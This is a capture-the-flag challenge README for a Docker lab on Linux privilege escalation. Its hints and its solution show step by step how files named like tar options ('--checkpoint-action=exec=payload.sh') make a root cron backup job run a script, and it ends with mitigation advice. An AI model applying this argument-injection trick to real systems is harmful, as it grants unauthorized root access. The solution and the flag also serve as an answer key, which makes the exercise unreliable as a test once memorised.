# Challenge 1  Wildcard Injection

**Difficulty:** Hard  
**Category:** Linux Privilege Escalation  
**Flag:** `/home/candie/vault/broomhilda.txt`

---

## Story

You are **Django**. You've made it onto Candyland plantation  but Broomhilda is locked
in Candie's vault, and only root can open it.

Stephen, Candie's loyal head slave, runs a backup job every minute.
He tars up everything in `/opt/candyland/backups` and thinks nothing of it.
He should have been more careful about wildcards.

---

## Setup

```bash
docker build -t ctf-linux-hard-1 .
docker run -it --rm --cap-add SYS_ADMIN ctf-linux-hard-1
```

Credentials: `django` / `freedom`

---

## Background: Tar Wildcard Injection

The `tar` command supports checkpoint actions:

```
--checkpoint=1
--checkpoint-action=exec=COMMAND
```

When `tar *` is run in a directory, the shell expands `*` into filenames **before**
passing them to tar. If you create files whose names look like tar flags, tar interprets
them as command-line options.

```bash
# These filenames become tar arguments:
--checkpoint=1
--checkpoint-action=exec=evil.sh
```

If tar is running as root, `evil.sh` executes as root.

---

## Hints

<details>
<summary>Hint 1</summary>
Look at the cron job:

```bash
cat /etc/cron.d/candyland
```

Notice the command: `tar czf /tmp/backup.tar.gz *`
The `*` is the vulnerability  it expands to all filenames in the directory.
</details>

<details>
<summary>Hint 2</summary>
You can write to `/opt/candyland/backups`. Create three files there:

1. A shell script with your payload
2. A file literally named `--checkpoint=1`
3. A file literally named `--checkpoint-action=exec=your_script.sh`

```bash
echo '#!/bin/bash' > /opt/candyland/backups/payload.sh
# ... add your payload ...
chmod +x /opt/candyland/backups/payload.sh
touch /opt/candyland/backups/--checkpoint=1
touch "/opt/candyland/backups/--checkpoint-action=exec=payload.sh"
```
</details>

<details>
<summary>Hint 3</summary>
Your payload needs to copy the flag to somewhere you can read it:

```bash
cp /home/candie/vault/broomhilda.txt /tmp/broomhilda.txt
chmod 777 /tmp/broomhilda.txt
```

Wait up to one minute for cron to fire.
</details>

---

## Solution

<details>
<summary>Click to reveal  try on your own first!</summary>

### Step 1  Confirm the cron job

```bash
cat /etc/cron.d/candyland
```

```
* * * * * root cd /opt/candyland/backups && tar czf /tmp/backup.tar.gz *
```

### Step 2  Create the payload script

```bash
cat > /opt/candyland/backups/payload.sh << 'EOF'
#!/bin/bash
cp /home/candie/vault/broomhilda.txt /tmp/broomhilda.txt
chmod 777 /tmp/broomhilda.txt
EOF
chmod +x /opt/candyland/backups/payload.sh
```

### Step 3  Create the malicious filenames

```bash
touch /opt/candyland/backups/--checkpoint=1
touch "/opt/candyland/backups/--checkpoint-action=exec=payload.sh"
```

When cron fires, the shell expands `*` into all filenames. Tar sees:
```
tar czf /tmp/backup.tar.gz --checkpoint=1 --checkpoint-action=exec=payload.sh payload.sh README.txt
```

### Step 4  Wait and read the flag

```bash
watch -n 2 ls /tmp/broomhilda.txt
# Once it appears:
cat /tmp/broomhilda.txt
```

```
CTF{br00mh1lda_w1ll_b3_fr33_dj4ng0}
```

### Why this works

`tar` processes filenames and flags in the same argument list, with no way to distinguish
between them when `*` expands. The `--checkpoint-action` flag was designed for legitimate
progress reporting but can execute arbitrary commands. Never use unquoted wildcards with
`tar` in privileged cron jobs. Use `tar czf archive.tar.gz ./*` (explicit `./` prefix)
or quote the wildcard: `tar czf archive.tar.gz '*'` to prevent shell expansion.

</details>
